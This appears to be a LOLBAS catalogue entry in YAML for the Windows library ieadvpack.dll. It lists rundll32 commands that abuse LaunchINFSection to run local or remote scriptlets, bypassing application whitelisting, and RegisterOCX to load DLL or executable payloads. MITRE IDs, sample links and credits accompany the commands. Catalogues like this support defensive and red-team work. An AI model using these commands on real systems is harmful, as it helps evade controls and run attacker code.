---
Name: Ieadvpack.dll
Description: INF installer for Internet Explorer. Has much of the same functionality as advpack.dll.
Author:
Created: 2018-05-25
Commands:
  - Command: rundll32.exe ieadvpack.dll,LaunchINFSection c:\test.inf,DefaultInstall_SingleUser,1,
    Description: Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (section name specified).
    Usecase: Run local or remote script(let) code through INF file specification.
    Category: AWL Bypass
    Privileges: User
    MitreID: T1218.011
    OperatingSystem: Windows
  - Command: rundll32.exe ieadvpack.dll,LaunchINFSection c:\test.inf,,1,
    Description: Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (DefaultInstall section implied).
    Usecase: Run local or remote script(let) code through INF file specification.
    Category: AWL Bypass
    Privileges: User
    MitreID: T1218.011
    OperatingSystem: Windows
  - Command: rundll32.exe ieadvpack.dll,RegisterOCX test.dll
    Description: Launch a DLL payload by calling the RegisterOCX function.
    Usecase: Load a DLL payload.
    Category: Execute
    Privileges: User
    MitreID: T1218.011
    OperatingSystem: Windows
  - Command: rundll32.exe ieadvpack.dll,RegisterOCX calc.exe
    Description: Launch an executable by calling the RegisterOCX function.
    Usecase: Run an executable payload.
    Category: Execute
    Privileges: User
    MitreID: T1218.011
  - Command: rundll32 ieadvpack.dll, RegisterOCX "cmd.exe /c calc.exe"
    Description: Launch command line by calling the RegisterOCX function.
    Usecase: Run an executable payload.
    Category: Execute
    Privileges: User
    MitreID: T1218.011
Full_Path:
  - Path: c:\windows\system32\ieadvpack.dll
  - Path: c:\windows\syswow64\ieadvpack.dll
Code_Sample:
  - Code: https://github.com/LOLBAS-Project/LOLBAS-Project.github.io/blob/master/_lolbas/Libraries/Payload/Ieadvpack.inf
  - Code: https://github.com/LOLBAS-Project/LOLBAS-Project.github.io/blob/master/_lolbas/Libraries/Payload/Ieadvpack_calc.sct
Detection:
  - IOC:
Resources:
  - Link: https://bohops.com/2018/03/10/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence-part-2/
  - Link: https://twitter.com/pabraeken/status/991695411902599168
  - Link: https://twitter.com/0rbz_/status/974472392012689408
Acknowledgement:
  - Person: Jimmy (LaunchINFSection)
    Handle: '@bohops'
  - Person: Fabrizio (RegisterOCX - DLL)
    Handle: '@0rbz_'
  - Person: Pierre-Alexandre Braeken (RegisterOCX - CMD)
    Handle: '@pabraeken'
---
